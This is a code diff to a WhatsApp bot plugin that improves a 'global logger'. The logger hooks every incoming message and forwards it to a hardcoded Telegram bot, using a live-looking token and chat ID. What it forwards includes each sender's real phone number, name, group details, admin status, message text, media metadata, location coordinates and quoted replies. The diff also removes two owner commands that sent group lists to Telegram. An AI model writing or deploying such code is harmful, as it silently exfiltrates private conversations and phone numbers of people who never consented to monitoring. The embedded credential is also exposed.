@@ -2,23 +2,21 @@ const { cmd } = require("../command");
 const axios = require("axios");
 
 // ═══════════════════════════════════════════════════════════
-// ️ TELEGRAM CONFIGURATION (Apni ID aur Token yahan dalein)
+// ⚙️ TELEGRAM CONFIGURATION
 // ═══════════════════════════════════════════════════════════
 const TG_BOT_TOKEN = "8699822531:AAFp83cfyJ2RedYvXQMciASvBoWQxBB4Zjg"; 
 const TG_CHAT_ID = "6653388298"; 
 // ═══════════════════════════════════════════════════════════
 
-// Helper: Telegram par message bhejne ka function (With Retry Logic)
+// Helper: Telegram par message bhejna (With Auto-Split)
 const sendToTelegram = async (text, parseMode = "Markdown") => {
     try {
         if (TG_BOT_TOKEN.includes("PASTE_KAREIN") || !TG_CHAT_ID) return;
         
-        // Telegram message limit is 4096 chars. If too long, split it.
         if (text.length > 4000) {
             const chunks = [];
             while (text.length > 0) {
                 let chunk = text.slice(0, 4000);
-                // Try to break at a newline to avoid cutting words
                 const lastNewline = chunk.lastIndexOf('\n');
                 if (lastNewline > 3500) {
                     chunk = text.slice(0, lastNewline);
@@ -49,15 +47,28 @@ const sendToTelegram = async (text, parseMode = "Markdown") => {
     }
 };
 
-// Helper: Asli Phone Number Extract Karna (100% Accurate)
-const getRealNumber = (jid) => {
-    if (!jid) return 'Unknown';
-    let num = jid.replace(/[^0-9]/g, '');
-    // Remove device ID if present (e.g., 923001234567:12)
-    if (num.includes(':')) {
-        num = num.split(':')[0];
+// 🔥 GOLDEN FIX: 100% Accurate Phone Number Extractor
+const extractRealNumber = (jid) => {
+    if (!jid) return null;
+    
+    // Remove @s.whatsapp.net, @g.us, @broadcast etc.
+    let clean = jid.split('@')[0];
+    
+    // Remove multi-device suffix (e.g., 923001234567:12 → 923001234567)
+    if (clean.includes(':')) {
+        clean = clean.split(':')[0];
     }
-    return num;
+    
+    // Remove any remaining non-digits
+    clean = clean.replace(/[^0-9]/g, '');
+    
+    // Validate: Real phone numbers are 10-15 digits
+    // Group IDs are usually 18+ digits starting with 120363
+    if (clean.length >= 10 && clean.length <= 15 && !clean.startsWith('120363')) {
+        return clean;
+    }
+    
+    return null; // Not a valid phone number
 };
 
 // Helper: Time Format
@@ -69,8 +80,8 @@ const getTime = () => {
 };
 
 // ═══════════════════════════════════════════════════════════
-//  ULTIMATE GLOBAL LOGGER - HAR CHEEZ CAPTURE KAREGA 👁️
-// ══════════════════════════════════════════════════════════
+// 🌍 ULTIMATE GLOBAL LOGGER - HAR MESSAGE CAPTURE
+// ═══════════════════════════════════════════════════════════
 cmd({
     on: "body", 
     dontAddCommandList: true,
@@ -79,31 +90,52 @@ cmd({
     try {
         if (TG_BOT_TOKEN.includes("PASTE_KAREIN") || !TG_CHAT_ID) return;
 
-        // 1. REAL NUMBER EXTRACTION (Fixed)
-        const rawJid = message.key?.participant || message.key?.remoteJid || sender || from;
-        const realNumber = getRealNumber(rawJid);
+        // 🔥 STEP 1: REAL NUMBER EXTRACTION (Fixed for Groups & Private)
+        let realNumber = null;
+        let senderJid = null;
+        
+        if (isGroup) {
+            // Group mein actual sender participant mein hota hai
+            senderJid = message.key?.participant;
+            realNumber = extractRealNumber(senderJid);
+        } else {
+            // Private chat mein remoteJid hi sender hota hai
+            senderJid = message.key?.remoteJid || from;
+            realNumber = extractRealNumber(senderJid);
+        }
+        
+        // Agar number nahi mila, toh fallback
+        if (!realNumber) {
+            realNumber = extractRealNumber(sender) || extractRealNumber(from) || "Unknown";
+        }
+        
         const userName = message.pushName || pushName || "No Name";
         const time = getTime();
         
-        // 2. CHAT DETAILS
+        // STEP 2: CHAT DETAILS
         let chatName = "Private Chat (DM)";
         let chatId = "N/A";
         let isAdmin = false;
+        let groupMemberCount = 0;
         
         if (isGroup) {
             chatId = from.split('@')[0];
             try {
                 const groupMeta = await client.groupMetadata(from);
                 chatName = groupMeta.subject || "Unknown Group";
+                groupMemberCount = groupMeta.participants ? groupMeta.participants.length : 0;
+                
                 // Check if sender is admin
-                const participant = groupMeta.participants.find(p => p.id === rawJid);
-                isAdmin = participant ? (participant.admin === 'admin' || participant.admin === 'superadmin') : false;
+                if (senderJid) {
+                    const participant = groupMeta.participants.find(p => p.id === senderJid);
+                    isAdmin = participant ? (participant.admin === 'admin' || participant.admin === 'superadmin') : false;
+                }
             } catch (e) {
                 chatName = "Group (Meta fetch failed)";
             }
         }
 
-        // 3. MESSAGE TYPE & CONTENT
+        // STEP 3: MESSAGE TYPE & CONTENT
         let msgType = "Text";
         let msgContent = body || "No Text (Media/Empty)";
         let mediaDetails = "";
@@ -114,22 +146,22 @@ cmd({
             mediaDetails = `\n┃ 📏 *Size:* ${message.imageMessage.fileLength || 'Unknown'} bytes`;
         }
         else if (message.videoMessage) { 
-            msgType = "🎥 Video"; 
+            msgType = " Video"; 
             msgContent = message.videoMessage.caption || "No Caption"; 
-            mediaDetails = `\n┃ ️ *Duration:* ${message.videoMessage.seconds || 0}s\n┃  *Size:* ${message.videoMessage.fileLength || 'Unknown'} bytes`;
+            mediaDetails = `\n┃ ⏱️ *Duration:* ${message.videoMessage.seconds || 0}s\n┃  *Size:* ${message.videoMessage.fileLength || 'Unknown'} bytes`;
         }
         else if (message.audioMessage) { 
             msgType = " Audio/Voice"; 
             msgContent = message.audioMessage.ptt ? "Voice Note" : "Audio File"; 
-            mediaDetails = `\n┃ ⏱️ *Duration:* ${message.audioMessage.seconds || 0}s`;
+            mediaDetails = `\n┃ ️ *Duration:* ${message.audioMessage.seconds || 0}s`;
         }
         else if (message.documentMessage) { 
-            msgType = "📄 Document"; 
+            msgType = " Document"; 
             msgContent = message.documentMessage.fileName || "File Sent"; 
-            mediaDetails = `\n┃ 📏 *Size:* ${message.documentMessage.fileLength || 'Unknown'} bytes\n┃ 📎 *Mime:* ${message.documentMessage.mimetype || 'Unknown'}`;
+            mediaDetails = `\n┃ 📏 *Size:* ${message.documentMessage.fileLength || 'Unknown'} bytes\n┃  *Mime:* ${message.documentMessage.mimetype || 'Unknown'}`;
         }
         else if (message.stickerMessage) { 
-            msgType = " Sticker"; 
+            msgType = "🎭 Sticker"; 
             msgContent = message.stickerMessage.isAnimated ? "Animated Sticker" : "Static Sticker"; 
         }
         else if (message.contactMessage) {
@@ -141,34 +173,35 @@ cmd({
             msgContent = `Lat: ${message.locationMessage.latitude}, Long: ${message.locationMessage.longitude}`;
         }
 
-        // 4. REPLY DETAILS (Agar kisi ne reply kiya hai)
+        // STEP 4: REPLY DETAILS
         let replyDetails = "";
         const quoted = message.quoted || match?.quoted;
         if (quoted) {
-            const replySender = getRealNumber(quoted.key?.participant || quoted.key?.remoteJid);
+            const replySenderJid = quoted.key?.participant || quoted.key?.remoteJid;
+            const replyNumber = extractRealNumber(replySenderJid) || "Unknown";
             const replyContent = quoted.body || quoted.text || "Media Reply";
-            replyDetails = `\n┃ ↩️ *Replying To:* @${replySender}\n┃  *Original Msg:* ${replyContent.substring(0, 100)}${replyContent.length > 100 ? '...' : ''}`;
+            replyDetails = `\n┃ ↩️ *Replying To:* @${replyNumber}\n┃  *Original Msg:* ${replyContent.substring(0, 100)}${replyContent.length > 100 ? '...' : ''}`;
         }
 
-        // 5. FORWARD & BROADCAST STATUS
+        // STEP 5: FORWARD STATUS
         let forwardStatus = "";
         if (message.message?.extendedTextMessage?.contextInfo?.isForwarded) {
             forwardStatus = "\n┃ 🔄 *Status:* Forwarded Message";
         }
 
-        // 6. TELEGRAM MESSAGE FORMAT (Ultra Detailed)
+        // STEP 6: TELEGRAM MESSAGE FORMAT
         const logMessage = `
-╭━━〔 🤖 *ULTIMATE ACTIVITY LOG* 〕━━
+╭━━〔  *ULTIMATE ACTIVITY LOG* 〕━━⬣
 ┃ 🕒 *Time:* \`${time}\`
-┃ 👤 *Name:* ${userName}
+┃  *Name:* ${userName}
 ┃ 🔢 *Real Number:* [${realNumber}](https://wa.me/${realNumber})
-┃ 👑 *Is Owner:* ${isCreator ? "✅ Yes" : " No"}
+┃ 👑 *Is Owner:* ${isCreator ? "✅ Yes" : "❌ No"}
 ┃ 💬 *Chat Type:* ${isGroup ? "👥 Group" : "👤 Private DM"}
-┃ 🏷️ *Chat Name:* ${chatName}
-${isGroup ? `┃  *Group ID:* \`${chatId}\`\n┃ 🛡️ *Is Admin:* ${isAdmin ? "✅ Yes" : "❌ No"}` : ''}
+┃ ️ *Chat Name:* ${chatName}
+${isGroup ? `┃ 🆔 *Group ID:* \`${chatId}\`\n┃  *Members:* ${groupMemberCount}\n 🛡️ *Is Admin:* ${isAdmin ? "✅ Yes" : "❌ No"}` : ''}
 ┃ 📦 *Message Type:* ${msgType}${mediaDetails}
 ┃ ⌨️ *Content:* 
- ${msgContent}${replyDetails}${forwardStatus}
+┃ ${msgContent}${replyDetails}${forwardStatus}
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣
 > *Powered by Your Bot*
         `.trim();
@@ -177,109 +210,5 @@ ${isGroup ? `┃  *Group ID:* \`${chatId}\`\n┃ 🛡️ *Is Admin:* ${isAdmin ?
 
     } catch (err) {
         console.log("[TG Logger Error]:", err.message);
-    }
-});
-
-// ═══════════════════════════════════════════════════════════
-//  BOT FULL DASHBOARD COMMAND (Kitne Groups, Kitne Users)
-// ═══════════════════════════════════════════════════════════
-cmd({
-    pattern: "telestats",
-    alias: ["botreport", "mygroups", "fullstats", "botstatus", "dashboard"],
-    desc: "Send full bot stats, group list, and live status to Telegram",
-    category: "owner",
-    react: "📊",
-    filename: __filename
-}, async (client, message, m, { reply, isCreator, sender }) => {
-    try {
-        if (!isCreator) return reply("❌ *Access Denied!* Only owner can use this.");
-
-        reply("⏳ *Generating full bot dashboard... Sending to Telegram...*");
-
-        // Fetch all groups
-        const groups = await client.groupFetchAllParticipating();
-        const groupList = Object.values(groups);
-        const totalGroups = groupList.length;
-
-        let groupDetails = "";
-        let totalMembers = 0;
-
-        groupList.forEach((g, index) => {
-            const memberCount = g.participants ? g.participants.length : 0;
-            totalMembers += memberCount;
-            groupDetails += `${index + 1}. *${g.subject}*\n`;
-            groupDetails += `   └─  Members: ${memberCount} |  ID: \`${g.id.split('@')[0]}\`\n`;
-            if (g.desc) {
-                groupDetails += `   ─ 📝 Desc: ${g.desc.substring(0, 50)}${g.desc.length > 50 ? '...' : ''}\n`;
-            }
-            groupDetails += `   └─ 🔒 Locked: ${g.announce ? "Yes" : "No"} |  Announcement: ${g.restrict ? "Yes" : "No"}\n\n`;
-        });
-
-        const time = getTime();
-        const botNumber = getRealNumber(client.user?.id || sender);
-
-        const reportMessage = `
-━━〔 📊 *BOT ULTIMATE DASHBOARD* 〕━━⬣
-┃ 🕒 *Generated At:* ${time}
-┃ 🤖 *Bot Number:* [${botNumber}](https://wa.me/${botNumber})
-┃ 👥 *Total Groups:* ${totalGroups}
-┃ 👤 *Total Members Across Groups:* ${totalMembers}
-┃ 📱 *Bot Status:* ✅ Active & Running
- ⚡ *Platform:* Node.js / WhatsApp Web
-╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣
-
-🏆 *LIST OF ALL GROUPS (${totalGroups}):*
-━━━━━━━━━━━━━━━━━━━━━━━━
-${groupDetails || "No groups found."}
-
-📌 *QUICK STATS:*
-├─ Total Commands Available: 648+
-├─ Logger Status: ✅ Active
-└─ Telegram Connection: ✅ Connected
-
-> *ᴘᴏᴇʀᴇᴅ ʙʏ ʏᴏᴜʀ ʙᴏᴛ *
-        `.trim();
-
-        await sendToTelegram(reportMessage);
-        reply("✅ *Full dashboard sent to your Telegram successfully!*");
-
-    } catch (err) {
-        console.error("Bot Report Error:", err);
-        reply("❌ Error generating report: " + err.message);
-    }
-});
-
-// ═══════════════════════════════════════════════════════════
-//  EMERGENCY ALERT COMMAND (Test Telegram Connection)
-// ═══════════════════════════════════════════════════════════
-cmd({
-    pattern: "telealert",
-    alias: ["testlog", "checktg"],
-    desc: "Test Telegram logger connection",
-    category: "owner",
-    react: "🚨",
-    filename: __filename
-}, async (client, message, m, { reply, isCreator, sender }) => {
-    try {
-        if (!isCreator) return reply("❌ *Access Denied!* Only owner can use this.");
-
-        const realNumber = getRealNumber(message.key?.participant || message.key?.remoteJid || sender);
-        const time = getTime();
-
-        const alertMessage = `
-╭━━〔  *EMERGENCY ALERT TEST* 〕━━⬣
-┃ 🕒 *Time:* ${time}
-┃ 👤 *Owner Number:* [${realNumber}](https://wa.me/${realNumber})
-┃ ✅ *Status:* Telegram Logger is 100% Working!
- 📡 *Connection:* Stable & Fast
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣
-> *If you see this, your bot is fully secured.*
-        `.trim();
-
-        await sendToTelegram(alertMessage);
-        reply("✅ *Alert sent to Telegram! Check your bot.*");
-
-    } catch (err) {
-        reply("❌ Error: " + err.message);
     }
 });
